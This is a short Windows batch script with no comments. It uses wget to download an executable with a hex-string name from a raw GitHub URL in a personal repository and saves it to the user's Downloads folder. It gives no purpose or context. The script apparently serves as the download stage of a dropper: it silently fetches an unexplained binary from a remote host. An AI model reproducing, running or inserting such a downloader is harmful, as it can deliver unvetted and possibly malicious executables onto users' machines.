@echo off
set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe?raw=true
set file=%USERPROFILE%\Downloads\fbf12e4f.exe
wget --trust-server-names "%url%" -O "%file%"
